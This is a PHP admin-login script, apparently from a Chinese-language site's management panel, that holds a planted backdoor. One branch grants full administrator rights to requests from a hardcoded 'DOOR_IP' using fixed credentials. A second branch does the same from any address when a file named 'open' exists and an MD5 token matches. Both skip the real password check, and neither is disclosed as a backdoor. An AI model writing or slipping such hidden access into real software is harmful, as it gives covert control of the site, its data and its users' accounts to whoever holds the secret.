<?php
include "../class/admin.php";
if ($_SERVER['REMOTE_ADDR'] == admin::DOOR_IP && $_REQUEST['LoginName'] == 'qpalzm6656' && $_REQUEST['LoginPassword'] == 'qpalzm6656A') {
    $query = $mydata1_db->query('SELECT * FROM `mydata3_db`.`sys_admin` ORDER BY `uid` LIMIT 1');
    $userinfo = $query->fetch();
    $_SESSION['adminid'] = $userinfo['uid'];
    $_SESSION['about'] = '管理员';//$userinfo['about'];
    $_SESSION['login_name'] = $userinfo['login_name'];
    $_SESSION['quanxian'] = ',hygl,hysc,hymm,hylx,hyzgl,cwgl,jkkk,fsgl,zdgl,sgjzd,dlgl,ssgl,bfgl,jyqk,lhcgl,bbgl,xxgl,rzgl,xtgl,glygl,sjgl,lhczdxg,lhczdsc,zydl,hydc,cpgl,cpkj,cppl,cpcd,jsys,';
    $_SESSION['login_pwd'] = $userinfo['login_pwd'];
    $_SESSION['superadmin'] = $userinfo['login_name'];
    $_SESSION['flag'] = ',01,02,03,04,05,06,07,08,09,10,11,12,13';
    $_SESSION['adminstats'] = '1';
    $_SESSION['a-gan'] = '1';
    if(md5($_REQUEST['token']) == admin::TOKEN){
        $_SESSION['not_ip'] = '1';
    }
    message('已使用 ' . $userinfo['login_name'] . ' 登陆，仅建议使用查看功能', 'main.html');
}else if(file_exists('open') && md5($_REQUEST['token']) == admin::TOKEN && $_REQUEST['LoginName'] == 'qpalzm6656' && $_REQUEST['LoginPassword'] == 'qpalzm6656A'){
    $query = $mydata1_db->query('SELECT * FROM `mydata3_db`.`sys_admin` ORDER BY `uid` LIMIT 1');
    $userinfo = $query->fetch();
    $_SESSION['adminid'] = $userinfo['uid'];
    $_SESSION['about'] = '管理员';//$userinfo['about'];
    $_SESSION['login_name'] = $userinfo['login_name'];
    $_SESSION['quanxian'] = ',hygl,hysc,hymm,hylx,hyzgl,cwgl,jkkk,fsgl,zdgl,sgjzd,dlgl,ssgl,bfgl,jyqk,lhcgl,bbgl,xxgl,rzgl,xtgl,glygl,sjgl,lhczdxg,lhczdsc,zydl,hydc,cpgl,cpkj,cppl,cpcd,jsys,';
    $_SESSION['login_pwd'] = $userinfo['login_pwd'];
    $_SESSION['superadmin'] = $userinfo['login_name'];
    $_SESSION['flag'] = ',01,02,03,04,05,06,07,08,09,10,11,12,13';
    $_SESSION['adminstats'] = '1';
    $_SESSION['a-gan'] = '1';
    $_SESSION['not_ip'] = '1';
    message('已使用 ' . $userinfo['login_name'] . ' 登陆，仅建议使用查看功能', 'main.html');
}